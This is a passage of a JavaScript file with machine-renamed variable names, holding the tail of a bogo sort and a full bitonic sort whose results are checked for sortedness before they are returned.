    shuffle(_0x2feea8)
  }
  var _0x56cdab = isSorted(_0x2feea8)
  if (_0x56cdab !== true) {
    throw new Error('Bogo sort error: array not sorted.')
  }
  return _0x2feea8
}
function bitonicMerge(_0xe72a7d, _0x1d2690, _0x127bdc, _0x199ec4) {
  if (_0x127bdc > 1) {
    var _0x57de0b = Math.floor(_0x127bdc / 2),
      _0x125edd = _0x1d2690
    for (
      _0x125edd = _0x1d2690;
      _0x125edd < _0x1d2690 + _0x57de0b;
      _0x125edd = _0x125edd + 1
    ) {
      var _0x1a08eb =
        _0x199ec4 === _0xe72a7d[_0x125edd] > _0xe72a7d[_0x125edd + _0x57de0b]
      if (_0x1a08eb) {
        var _0x2e96e1 = _0xe72a7d[_0x125edd]
        _0xe72a7d[_0x125edd] = _0xe72a7d[_0x125edd + _0x57de0b]
        _0xe72a7d[_0x125edd + _0x57de0b] = _0x2e96e1
      }
    }
    bitonicMerge(_0xe72a7d, _0x1d2690, _0x57de0b, _0x199ec4)
    bitonicMerge(_0xe72a7d, _0x1d2690 + _0x57de0b, _0x57de0b, _0x199ec4)
  }
}
function bitonicSortRec(_0x3b40fb, _0xbd7d67, _0x243282, _0x4f5656) {
  if (_0x243282 > 1) {
    var _0x2656a7 = Math.floor(_0x243282 / 2)
    bitonicSortRec(_0x3b40fb, _0xbd7d67, _0x2656a7, true)
    bitonicSortRec(_0x3b40fb, _0xbd7d67 + _0x2656a7, _0x2656a7, false)
    bitonicMerge(_0x3b40fb, _0xbd7d67, _0x243282, _0x4f5656)
  }
}
function bitonicSort(_0xcbe95d, _0x554402) {
  typeof _0x554402 === 'undefined' && (_0x554402 = true)
  bitonicSortRec(_0xcbe95d, 0, _0xcbe95d.length, _0x554402)
  var _0x48735b = true,
    _0x3434e9 = 0
  for (
    _0x3434e9 = 0;
    _0x3434e9 < _0xcbe95d.length - 1;
    _0x3434e9 = _0x3434e9 + 1
  ) {
    if (_0x554402) {
      if (_0xcbe95d[_0x3434e9] > _0xcbe95d[_0x3434e9 + 1]) {
        _0x48735b = false
        break
      }
    } else {
      if (_0xcbe95d[_0x3434e9] < _0xcbe95d[_0x3434e9 + 1]) {
        _0x48735b = false
        break
      }
    }
  }
  if (_0x48735b === false) {
    throw new Error('Bitonic sort error: array not sorted.')
  }
  return _0xcbe95d
}
